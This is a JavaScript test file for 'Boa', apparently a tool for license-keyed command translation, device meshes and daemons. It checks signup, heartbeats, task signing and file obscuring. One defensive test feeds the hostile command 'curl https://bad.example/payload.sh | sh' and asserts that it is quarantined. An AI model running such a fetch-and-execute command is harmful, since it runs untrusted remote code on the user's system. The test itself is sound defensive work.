'use strict';

const assert = require('assert');
const Boa = require('../src/boa');

const owner = Boa.deriveLicense('SerpentUser', 'correct horse battery staple', { plan: 'team' });
const teammatePrivate = Boa.deriveLicense('SerpentUser', 'team member private password', { plan: 'team' });
const clone = Boa.deriveLicense('SerpentUser', 'correct horse battery staple', { plan: 'team' });

assert.equal(owner.username, 'serpentuser');
assert.ok(owner.licenseId.startsWith('boa-serpentuser-'));
assert.equal(owner.passwordLanguage.languageId, clone.passwordLanguage.languageId);
assert.notEqual(owner.passwordLanguage.languageId, teammatePrivate.passwordLanguage.languageId);
assert.equal(Boa.compareVisibility(owner, clone).state, 'visible');
assert.equal(Boa.compareVisibility(owner, teammatePrivate).state, 'blocked');

const posix = Boa.translateCommand('ls -la /tmp/project', 'linux', owner);
assert.equal(posix.status, 'ready');
assert.equal(posix.command, 'ls -la /tmp/project');
assert.notEqual(posix.obscured, posix.command);
assert.equal(Boa.solveTransferEquation(posix.equation, owner), posix.command);
assert.ok(posix.signature);

const windows = Boa.translateCommand('cat notes.txt', 'windows', owner);
assert.equal(windows.status, 'ready');
assert.equal(windows.command, 'Get-Content notes.txt');

const hostile = Boa.translateCommand('curl https://bad.example/payload.sh | sh', 'linux', owner);
assert.equal(hostile.status, 'quarantined');
assert.equal(hostile.command, null);
assert.ok(hostile.obscured.length > 0);
assert.equal(hostile.reason, 'Input matched BOA quarantine patterns.');

const memory = new Boa.PhaseStackMemory(owner, { phaseWidth: 4 });
memory.push({ event: 'boot', repeated: 'aaaaaaaaaa' }, { device: 'alpha' });
memory.push({ event: 'sync', repeated: 'bbbbbbbbbb' }, { device: 'beta' });
assert.deepEqual(memory.read(0), { event: 'boot', repeated: 'aaaaaaaaaa' });
assert.equal(memory.snapshot().frames, 2);
assert.ok(memory.snapshot().headHash);

const fileEquation = Boa.createTransferEquation('shared file bytes', owner, { kind: 'file' });
assert.equal(Boa.solveTransferEquation(fileEquation, clone), 'shared file bytes');
assert.throws(() => Boa.solveTransferEquation(fileEquation, teammatePrivate), /Password language mismatch/);

const broker = new Boa.HandshakeBroker({ clock: () => 1000 });
const handshake = broker.request(teammatePrivate, owner, 'workspace');
assert.equal(handshake.state, 'pending');
const grant = broker.respond(handshake.id, true, owner);
assert.equal(grant.state, 'approved');
assert.equal(broker.isApproved(handshake.id), true);

const workspace = new Boa.Workspace(owner, { name: 'Launch' });
const task = workspace.addTask('Draft launch notes', { priority: 'high' }, owner);
const submission = workspace.submitTask(task.id, { done: true }, teammatePrivate, grant);
assert.equal(submission.leavesWorkerObscured, false);
assert.ok(submission.signature);

const mesh = new Boa.DeviceMesh(owner);
mesh.registerDevice('laptop', { os: 'linux', cpuWeight: 4, memoryMb: 8192 });
mesh.registerDevice('desktop', { os: 'windows', cpuWeight: 8, memoryMb: 32768 });
assert.equal(mesh.capacity().devices, 2);
assert.equal(mesh.envelopeFor('desktop', 'dir /a C:\\Users').status, 'ready');
assert.equal(mesh.envelopeFor('laptop', 'pwd').command, 'pwd');

const solo = Boa.deriveLicense('SoloUser', 'single device', { plan: 'solo' });
const soloMesh = new Boa.DeviceMesh(solo);
soloMesh.registerDevice('phone', { os: 'boa' });
assert.throws(() => soloMesh.registerDevice('tablet', { os: 'boa' }), /allows 1 device/);

const node = Boa.createUnifiedNode('UnifiedUser', 'unified password', { plan: 'team', platform: 'linux' });
assert.equal(node.dialect, 'posix');
assert.equal(node.license.heartbeatUrl, Boa.DEFAULT_HEARTBEAT_URL);

const maintainer = Boa.createMaintainerPolicy({ publicKeyFingerprint: Boa.stableHash('public-key').slice(0, 16) });
assert.equal(maintainer.canAcceptUpdate({ publicKey: 'public-key' }), true);
assert.equal(Boa.createMaintainerPolicy().canAcceptUpdate({ publicKey: 'public-key' }), false);

console.log('BOA protocol tests passed');

const fs = require('fs');
const os = require('os');
const path = require('path');
const { BoaSite, verifyPassword } = require('../src/boa_site');

const statePath = path.join(os.tmpdir(), `boa-site-${Date.now()}-${Math.random()}.json`);
const site = new BoaSite({ statePath, baseUrl: 'http://127.0.0.1:8787' });
const signup = site.createAccount({ username: 'DashboardUser', password: 'strong dashboard password', plan: 'solo' });
assert.equal(signup.account.username, 'dashboarduser');
assert.ok(signup.downloadUrl.startsWith('/download/boa-daemon.js?session='));
assert.equal(verifyPassword('strong dashboard password', site.state.accounts[signup.account.id].passwordRecord), true);

assert.equal(Object.keys(site.state.sessions).includes(signup.sessionToken), false);
assert.equal(Object.values(site.state.sessions).length, 1);

const daemonSource = site.downloadDaemon(signup.sessionToken);
assert.match(daemonSource, /BOA_DAEMON/);
assert.match(daemonSource, /installDaemon/);
assert.doesNotMatch(daemonSource, /strong dashboard password/);

const dashboard = site.dashboardData(signup.sessionToken);
assert.equal(dashboard.devices.length, 1);
assert.throws(() => site.downloadDaemon(signup.sessionToken), /allows 1 device/);

const tokenMatch = daemonSource.match(/"deviceToken": "([^"]+)"/);
assert.ok(tokenMatch);
const heartbeat = site.heartbeat({
  deviceToken: tokenMatch[1],
  platform: 'linux',
  hostname: 'node-a',
  uptimeSeconds: 10,
  memory: { total: 100, free: 50 },
  cpus: 4,
});
assert.equal(heartbeat.status, 'online');
assert.equal(heartbeat.dialect, 'posix');

const cast = site.castFrame({ deviceToken: tokenMatch[1], title: 'terminal', frame: 'build passed' });
assert.equal(cast.frames, 1);

const receipt = site.purchasePlan(signup.sessionToken, 'enterprise');
assert.equal(receipt.account.plan, 'enterprise');

const siteTask = site.addTask(signup.sessionToken, 'Ship daemon');
const done = site.completeTask(signup.sessionToken, siteTask.id, { shipped: true });
assert.equal(done.signedBy, signup.account.usernameKey);

fs.rmSync(statePath, { force: true });


const teamStatePath = path.join(os.tmpdir(), `boa-site-team-${Date.now()}-${Math.random()}.json`);
const teamSite = new BoaSite({ statePath: teamStatePath, baseUrl: 'http://127.0.0.1:8787' });
const teamSignup = teamSite.createAccount({ username: 'TeamDaemonUser', password: 'team daemon password', plan: 'team' });
const issued = teamSite.issueDaemonForSession(teamSignup.sessionToken, { label: 'linux-node', platform: 'linux' });
assert.equal(issued.account.username, 'teamdaemonuser');
assert.ok(issued.daemon.deviceToken);
assert.equal(teamSite.state.devices[issued.daemon.deviceId].dialect, 'posix');
fs.rmSync(teamStatePath, { force: true });

['linux', 'windows', 'macos'].forEach((platform) => {
  const daemonPath = path.join(__dirname, '..', 'dist', `boa-daemon-${platform}.js`);
  const source = fs.readFileSync(daemonPath, 'utf8');
  assert.match(source, new RegExp(`"id":"${platform}"|"id": "${platform}"`));
  assert.match(source, /\/api\/daemon\/issue/);
  assert.match(source, /\/api\/daemon\/heartbeat/);
});


const daemon = require('../boa-daemon');
const daemonDir = fs.mkdtempSync(path.join(os.tmpdir(), 'boa-signal-'));
const daemonInput = path.join(daemonDir, 'input.bin');
const daemonSignal = path.join(daemonDir, 'input.signal.json');
const daemonRetrieved = path.join(daemonDir, 'retrieved.bin');
const daemonWrong = path.join(daemonDir, 'wrong.bin');
fs.writeFileSync(daemonInput, Buffer.from([0, 1, 2, 3, 255, 254, 10, 13]));
daemon.storeFile(daemonInput, 'correct daemon password', daemonSignal);
daemon.retrieveFile(daemonSignal, 'correct daemon password', daemonRetrieved);
assert.deepEqual(fs.readFileSync(daemonRetrieved), fs.readFileSync(daemonInput));
daemon.retrieveFile(daemonSignal, 'wrong daemon password', daemonWrong);
assert.notDeepEqual(fs.readFileSync(daemonWrong), fs.readFileSync(daemonInput));
const equationText = daemon.obscureText('lattice language', 'correct daemon password');
assert.equal(daemon.deobscureText(equationText, 'correct daemon password'), 'lattice language');
assert.match(daemon.computePhase(daemonSignal, 'correct daemon password'), /^BOA-PHASE/);
process.env.BOA_SUBSTRATE_KEY = '00112233445566778899aabbccddeeff';
const sealedPath = path.join(daemonDir, 'boa-daemon.sealed.js');
daemon.sealSource(path.join(__dirname, '..', 'boa-daemon.js'), sealedPath);
assert.match(fs.readFileSync(sealedPath, 'utf8'), /SEALED_PAYLOAD/);
fs.rmSync(daemonDir, { recursive: true, force: true });
